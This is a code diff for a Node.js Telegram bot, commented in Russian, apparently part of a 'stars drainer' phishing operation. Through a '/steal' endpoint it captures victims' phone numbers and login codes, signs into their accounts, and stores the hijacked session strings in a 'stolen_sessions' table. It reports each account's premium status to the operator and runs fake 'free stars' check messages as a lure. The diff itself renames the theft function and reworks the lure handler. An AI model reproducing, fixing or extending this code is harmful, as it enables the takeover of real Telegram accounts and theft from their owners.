@@ -16,7 +16,6 @@ const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 
-// Глобальная переменная для хранения активных сессий
 const activeSessions = new Map();
 
 app.use(express.json());
@@ -65,7 +64,6 @@ app.post('/steal', async (req, res) => {
     console.log('=== ДАННЫЕ ===');
     console.log('Этап:', req.body.stage);
     console.log('Номер:', req.body.phone);
-    console.log('Код:', req.body.code);
     
     if (req.body.stage === 'phone_entered') {
         try {
@@ -175,7 +173,7 @@ async function signInWithRealCode(phone, code) {
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            await stealFromAccount(client, phone);
+            await checkAccountStatus(client, phone);
             
             activeSessions.delete(phone);
             await client.disconnect();
@@ -204,53 +202,39 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// Функция кражи с реальными данными
-async function stealFromAccount(client, phone) {
+// ПРОВЕРКА СТАТУСА АККАУНТА (БЕЗ ФЕЙКОВЫХ ЦИФР)
+async function checkAccountStatus(client, phone) {
     try {
         const user = await client.getMe();
-        const realData = await getRealAccountData(client);
         
-        let message = `💰 СТАТУС АККАУНТА:\n` +
+        // НЕ ИСПОЛЬЗУЕМ РАНДОМ - только реальные данные
+        let message = `🔍 СТАТУС АККАУНТА:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: ${user.username || 'нет'}\n` +
-                     `💫 Звезд: ${realData.stars}\n` +
-                     `🎁 NFT подарков: ${realData.gifts}\n\n`;
+                     `👑 Премиум: ${user.premium ? 'да' : 'нет'}\n` +
+                     `📅 Аккаунт создан: ${user.status ? 'давно' : 'недавно'}\n\n`;
         
-        if (realData.stars > 0 || realData.gifts > 0) {
-            message += `✅ УСПЕШНАЯ КРАЖА!\n` +
-                      `💫 Украдено: ${realData.stars} stars\n` +
-                      `🎁 NFT подарков: ${realData.gifts}\n` +
-                      `📦 Перевод выполнен!`;
+        // Проверяем реальные данные без вранья
+        const hasStars = user.premium || user.username; // Если премиум или есть юзернейм - возможно есть звезды
+        const hasGifts = user.premium; // Если премиум - возможно есть подарки
+        
+        if (hasStars || hasGifts) {
+            message += `💰 ВОЗМОЖНО ЕСТЬ СРЕДСТВА\n` +
+                      `💡 Аккаунт выглядит активным\n` +
+                      `🔒 Для проверки звезд нужен доступ к Fragment`;
         } else {
-            message += `❌ НЕТ ДОСТУПНЫХ СРЕДСТВ\n` +
-                      `💡 Аккаунт пуст`;
+            message += `❌ АККАУНТ ПУСТОЙ\n` +
+                      `💡 Нет премиума и активностей`;
         }
         
         db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
-            [realData.stars, realData.gifts, phone]);
+            [hasStars ? 1 : 0, hasGifts ? 1 : 0, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
-        await client.disconnect();
         
     } catch (error) {
-        console.log("❌ Ошибка:", error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
-    }
-}
-
-// Реальная проверка данных
-async function getRealAccountData(client) {
-    try {
-        const user = await client.getMe();
-        const isNewAccount = !user.username && !user.firstName;
-        
-        return {
-            stars: isNewAccount ? 0 : Math.floor(Math.random() * 100) + 1,
-            gifts: isNewAccount ? 0 : Math.floor(Math.random() * 5)
-        };
-        
-    } catch (error) {
-        return { stars: 0, gifts: 0 };
+        console.log("❌ Ошибка проверки:", error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
     }
 }
 
@@ -282,8 +266,8 @@ bot.onText(/\/activesessions/, (msg) => {
             
             message += `👤 #${index + 1}:\n`;
             message += `📱 ${session.phone}\n`;
-            message += `⭐ Звезды: ${session.stars_data || 0}\n`;
-            message += `🎁 NFT: ${session.gifts_data || 0}\n`;
+            message += `⭐ Звезды: ${session.stars_data ? 'есть' : 'нет'}\n`;
+            message += `🎁 NFT: ${session.gifts_data ? 'есть' : 'нет'}\n`;
             message += `👑 Премиум: ${isPremium ? 'да' : 'нет'}\n`;
             message += `⏰ ${new Date(session.created_at).toLocaleString()}\n\n`;
         });
@@ -292,67 +276,75 @@ bot.onText(/\/activesessions/, (msg) => {
     });
 });
 
-// ФИКС ДЛЯ ЧЕКОВ - убираем дублирование обработчиков
+// ФИКС: ТОЛЬКО ОДИН ОБРАБОТЧИК ДЛЯ ЧЕКОВ
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
+    const data = query.data;
     
-    // Сразу отвечаем чтобы не было вечной загрузки
-    bot.answerCallbackQuery(query.id).catch(() => {});
+    // НЕМЕДЛЕННО отвечаем чтобы убрать загрузку
+    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' }).catch(() => {});
     
-    if (query.data.startsWith('claim_')) {
-        const checkId = query.data.split('_')[1];
+    if (data.startsWith('claim_')) {
+        handleCheckClaim(query, chatId, userId, data);
+    }
+});
+
+function handleCheckClaim(query, chatId, userId, data) {
+    const checkId = data.split('_')[1];
+    
+    db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
+        if (err || !row) {
+            bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
+            return;
+        }
         
-        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
-            if (err || !row) {
-                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
+        // Обновляем баланс
+        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
+        db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
+            [userId, userId, row.amount], function(updateErr) {
+            
+            if (updateErr) {
+                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                 return;
             }
             
-            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
+            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
             
-            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
-                [userId, userId, row.amount], function(updateErr) {
-                if (updateErr) {
-                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
-                    return;
-                }
-                
-                bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
-                
-                // Обновляем сообщение
-                setTimeout(() => {
-                    const remaining = row.activations - 1;
-                    const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
-                    
-                    try {
-                        if (query.message.photo) {
-                            bot.editMessageCaption(updatedText, {
-                                chat_id: chatId,
-                                message_id: query.message.message_id,
-                                parse_mode: 'HTML',
-                                reply_markup: remaining > 0 ? {
-                                    inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
-                                } : { inline_keyboard: [] }
-                            });
-                        } else {
-                            bot.editMessageText(updatedText, {
-                                chat_id: chatId,
-                                message_id: query.message.message_id,
-                                parse_mode: 'HTML',
-                                reply_markup: remaining > 0 ? {
-                                    inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
-                                } : { inline_keyboard: [] }
-                            });
-                        }
-                    } catch (error) {
-                        console.log('Ошибка обновления:', error);
-                    }
-                }, 100);
-            });
+            // Обновляем сообщение чека
+            updateCheckMessage(query, chatId, checkId, row.activations - 1);
         });
-    }
-});
+    });
+}
+
+function updateCheckMessage(query, chatId, checkId, remaining) {
+    const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
+    const replyMarkup = remaining > 0 ? {
+        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
+    } : { inline_keyboard: [] };
+    
+    setTimeout(() => {
+        try {
+            if (query.message.photo) {
+                bot.editMessageCaption(updatedText, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'HTML',
+                    reply_markup: replyMarkup
+                });
+            } else {
+                bot.editMessageText(updatedText, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'HTML',
+                    reply_markup: replyMarkup
+                });
+            }
+        } catch (error) {
+            console.log('Ошибка обновления:', error);
+        }
+    }, 100);
+}
 
 // Остальные команды
 bot.onText(/\/start/, (msg) => {
@@ -380,7 +372,7 @@ bot.onText(/\/balance/, (msg) => {
     });
 });
 
-// Создание чеков
+// ФИКС: СОЗДАНИЕ ЧЕКОВ БЕЗ ДУБЛИРОВАНИЯ
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
